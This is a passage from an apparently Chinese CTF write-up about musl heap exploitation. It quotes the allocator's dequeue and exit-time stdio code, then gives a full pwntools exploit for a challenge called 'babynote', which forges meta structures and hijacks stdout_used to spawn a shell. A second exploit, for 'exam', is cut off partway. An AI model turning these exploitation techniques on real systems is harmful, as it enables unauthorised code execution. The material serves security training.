(meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ŒæˆæŒ‡é’ˆäº’å†™çš„å…³é”®å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x1.2 åˆ©ç”¨æ€è·¯</p>
<p>1.åœ¨freeçš„æ—¶å€™dequeueå‡½æ•°è„±é“¾æ£€æŸ¥ä¸ä¸¥æ ¼ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¼ªé€ metaè¿›è¡ŒæŒ‡é’ˆäº’å†™</p>
<p>2.åœ¨å®Œæˆç¬¬ä¸€æ­¥ä»¥å,è¢«ä¼ªé€ çš„metaå°±ä¼šè¢«freeæ‰ï¼Œä¸‹æ¬¡mallocç”³è¯·metaçš„æ—¶å€™queueå°±ä¼šç”³è¯·åˆ°fak)meta,æ‰€ä»¥å¯ä»¥ç»“åˆdequeueå’Œqueueè¿›è¡Œä»»æ„åœ°å€ç”³è¯·</p>
<p>3.ä¸€èˆ¬çš„æ”»å‡»ç›®æ ‡å°±æ˜¯ioç»“æ„ï¼Œä¹Ÿå°±æ˜¯fsop,åªè¦èƒ½æ§åˆ¶stdout stdinæˆ–è€…stderrå…¶ä¸­ä¸€ä¸ªç»“æ„ä½“ï¼Œä»¤å…¶flagsä¸ºâ€™/bin/shâ€™ï¼ŒwriteæŒ‡é’ˆä¸ºâ€™systemâ€™å°±å¯ä»¥å®Œæˆgetshell,ç©¶å…¶åŸå› å°±æ˜¯exitä¼šå¯¹ioç»“æ„è¿›è¡Œæ¸…ç†ï¼Œä»£ç å¦‚ä¸‹,å½“ç„¶ä¹Ÿå¯ä»¥æ§åˆ¶std_uesd,è¿™æ ·åªéœ€è¦ä¸€æ¬¡æŒ‡é’ˆäº’å†™å°±å¯ä»¥åšåˆ°ï¼Œå¯¹io_fileè¿›è¡Œæ§åˆ¶åˆ™æ¯”è¾ƒéº»çƒ¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">weak_alias(libc_exit_fini, __libc_exit_fini);</span><br><span class="line"></span><br><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x2-babynote"><a href="#0x2-babynote" class="headerlink" title="0x2 babynote"></a>0x2 babynote</h2><p>å°±æ˜¯åˆ©ç”¨stdout_usedå®Œæˆgetshell,æœ¬æ¥å·²ç»å¯ä»¥ç”³è¯·åˆ°io_fileäº†ï¼Œä½†æ˜¯callocä¼šæ¸…é›¶ï¼Œç ´åio_file,ä¹Ÿæ²¡çœ‹æ‡‚å®˜æ–¹wpæ˜¯æ€ä¹ˆç»•è¿‡çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh= process([<span class="string">&quot;/home/rootzhang/musl/musl-1.2.2/build/lib/libc.so&quot;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="comment">#sh=remote(&quot;123.60.76.240&quot;,60001)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size,name,note_size,note</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;note size: &quot;</span>,<span class="built_in">str</span>(note_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;note content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name_size,name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forget</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x7ffff7ff0000+0x1679)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;2\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;3\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;4\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;4\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;5\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;5\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;7\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;7\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>)</span><br><span class="line">    find(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">    m=sh.recv(<span class="number">12</span>)</span><br><span class="line">    libc_addr=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        libc_addr+=m[(<span class="number">5</span>-i)*<span class="number">2</span>]+m[<span class="number">2</span>*(<span class="number">5</span>-i)+<span class="number">1</span>]</span><br><span class="line">    libc_base=<span class="built_in">int</span>(libc_addr,<span class="number">16</span>)-<span class="number">0xcb0</span>+<span class="number">0x1000</span></span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;7\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x09\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0b\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0b\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x09\n&#x27;</span>)</span><br><span class="line">    malloc_content=libc_base+<span class="number">0x1aa0</span></span><br><span class="line">    fake_content=p64(libc_base-<span class="number">0x1000</span>+<span class="number">0x50</span>)+p64(malloc_content)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0c\n&#x27;</span>,<span class="number">0x28</span>,fake_content)</span><br><span class="line">    find(<span class="number">0x40</span>,<span class="string">&#x27;\x00\n&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">    m=sh.recv(<span class="number">16</span>)</span><br><span class="line">    check=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        check+=m[(<span class="number">7</span>-i)*<span class="number">2</span>]+m[<span class="number">2</span>*(<span class="number">7</span>-i)+<span class="number">1</span>]</span><br><span class="line">    check=<span class="built_in">int</span>(check,<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0c\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0b\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0e\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0e\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0e\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    fake_mem_addr=libc_base-<span class="number">0xc000</span>+<span class="number">0x1000</span>+<span class="number">0x40</span></span><br><span class="line">    fake_meta_addr=libc_base-<span class="number">0xc000</span>+<span class="number">0x1000</span>+<span class="number">0x10</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0f\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0f\n&#x27;</span>)</span><br><span class="line">    stdout_addr=libc_base+<span class="number">0x12e0</span></span><br><span class="line">    stderr_addr=libc_base+<span class="number">0x10e0</span></span><br><span class="line">    stdout_use_addr=libc_base+<span class="number">0x1410</span></span><br><span class="line">    execve_addr=libc_base-<span class="number">0x259323</span></span><br><span class="line">    sc = <span class="number">8</span></span><br><span class="line">    freeable = <span class="number">1</span></span><br><span class="line">    last_idx = <span class="number">0</span></span><br><span class="line">    maplen = <span class="number">1</span></span><br><span class="line">    fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    fake_meta += p64(fake_mem_addr+<span class="number">0x10</span>) <span class="comment"># prev</span></span><br><span class="line">    fake_meta += p64(stdout_use_addr) <span class="comment"># next</span></span><br><span class="line">    fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">    fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">    fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">    fake_meta += p64(<span class="number">0</span>)</span><br><span class="line">    fake_mem=p64(fake_meta_addr)</span><br><span class="line">    fake_mem += p32(<span class="number">1</span>)</span><br><span class="line">    fake_mem += p32(<span class="number">0</span>)</span><br><span class="line">    fake_io=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>+p64(<span class="number">0xdeadbeef</span>) + <span class="string">&#x27;x&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xbeefdead</span>)+p64(execve_addr) + p64(execve_addr)</span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x20</span>)</span><br><span class="line">    payload+=p64(check)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=fake_meta</span><br><span class="line">    payload+=fake_mem</span><br><span class="line">    payload+=fake_io</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x10\n&#x27;</span>,<span class="number">0x2000</span>,payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x11\n&#x27;</span>,<span class="number">0x2000</span>,<span class="string">&#x27;\x11\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0f\n&#x27;</span>)</span><br><span class="line">    fake_content=p64(libc_base+<span class="number">0x48e0</span>+<span class="number">0x10</span>)+p64(fake_mem_addr+<span class="number">0x10</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x12\n&#x27;</span>,<span class="number">0x28</span>,fake_content)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x35\n&#x27;</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    <span class="comment"># free(0x40,&#x27;\x10\n&#x27;)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x13\n&#x27;,0x80,&#x27;a\n&#x27;)</span></span><br><span class="line">    <span class="comment"># sc = 8</span></span><br><span class="line">    <span class="comment"># last_idx=1</span></span><br><span class="line">    <span class="comment"># payload=&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># payload+=&#x27;\x00&#x27;*(0x1000-0x20-0x10)</span></span><br><span class="line">    <span class="comment"># payload+=p64(check)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(fake_meta_addr)+p64(fake_meta_addr)</span></span><br><span class="line">    <span class="comment"># payload+=p64(stdout_addr-0x20-0x20)</span></span><br><span class="line">    <span class="comment"># payload+=p32(1) + p32(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64((sc &lt;&lt; 6) | last_idx)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x14\n&#x27;,0x2000,payload+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x15\n&#x27;,0x80,&#x27;ssss\n&#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-exam"><a href="#0x3-exam" class="headerlink" title="0x3 exam"></a>0x3 exam</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>(<span class="params">num_questions</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;enter the number of questions:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num_questions))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_sorce</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">i,idx,size,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;which one? &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;please input the size of comment: &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;enter your comment:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;which student id to choose?&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>(<span class="params">i</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_mode</span>(<span class="params">i,content,score=<span class="number">100</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;enter your mode!\n&quot;</span>)</span><br><span class="line">        sh.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;enter your pray score: 0 to 100\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(score))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your id: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>():</span></span><br><span class="line">    